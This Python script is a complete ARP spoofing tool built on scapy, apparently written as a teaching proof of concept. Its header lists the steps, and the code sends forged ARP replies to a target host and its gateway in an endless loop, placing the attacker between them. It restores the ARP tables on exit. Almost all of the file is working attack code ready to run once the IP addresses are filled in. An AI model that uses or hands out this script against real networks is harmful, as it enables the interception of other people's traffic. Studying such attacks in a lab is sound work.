#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Project : OpenChat
File    : Clienet.py
Author  : Ib Helmer Nielsen
Version : 0.1.0 / 05.10.2021
Email   : ihn@ucn.dk
Status  : Prove of concept
License : MPL 2.0
Description: Simple ARP spoofing example using scapy. Following this steps to create an aro spoof.
    1) Get the IP address that you want to spoof
    2) Get the MAC address of the IP that yau want to spoof (eg with OS: ping <ip> and then arp -a)
    3) Then create a spoofing packet with the ARP() function to set the target IP,
       Spoof IP and it’s MAC address that you found above.
    4) Start the spoofing
    5) Display the information of the numbers of packets sent
    6) Finally, re-set the ARP tables of the spoofed address to defaults after spoofing
"""
# Imports
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "10.0.2.5"  # Enter your target IP
gateway_ip = "10.0.2.1"  # Enter your gateway's IP

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")